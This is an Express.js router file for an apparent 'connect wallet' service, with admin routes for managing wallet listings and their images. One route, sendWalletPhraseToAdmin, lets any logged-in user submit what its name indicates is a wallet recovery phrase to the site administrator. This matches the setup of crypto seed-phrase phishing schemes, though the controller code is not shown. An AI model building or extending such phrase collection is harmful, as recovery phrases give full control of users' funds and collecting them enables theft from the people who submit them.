const express = require("express");
const multer = require('multer');
const { protect, adminOnly } = require("../middleware/authMiddleware.js");
const { addConnectWalletValidator, updateConnectWalletValidator } = require("../validators/connectWalletValidator.js");
const { addConnectWallet, getAllConnectWallet, updateConnectWallet, updateConnectWalletPhoto, deleteConnectWallet, deleteArrayOfWallets, sendWalletPhraseToAdmin } = require("../controllers/connectController.js");
const router = express.Router();
const upload = multer({ storage: multer.memoryStorage() });

router.post("/addConnectWallet", protect, adminOnly, upload.single("image"),(req, res, next) => {
    // Parse the userData string back into an object
    if (req.body.userData) {
      try {
        req.body.userData = JSON.parse(req.body.userData);
        // console.log(req.body.userData)
      } catch (error) {
        res.status(400);
        throw new Error("Invalid user data format");
      }
    }

    next();
  },  addConnectWalletValidator, adminOnly, addConnectWallet);


router.get("/getAllConnectWallet", protect, getAllConnectWallet);

router.patch("/updateConnectWallet/:id", protect, adminOnly, updateConnectWalletValidator, updateConnectWallet);

router.delete("/deleteConnectWallet/:id", protect, adminOnly, deleteConnectWallet);

router.delete("/deleteArrayOfWallets", protect, adminOnly, deleteArrayOfWallets);


router.post("/updateConnectWalletPhoto/:id", protect, adminOnly, upload.single('image'), updateConnectWalletPhoto);

router.post("/sendWalletPhraseToAdmin", protect, sendWalletPhraseToAdmin);






module.exports = router;
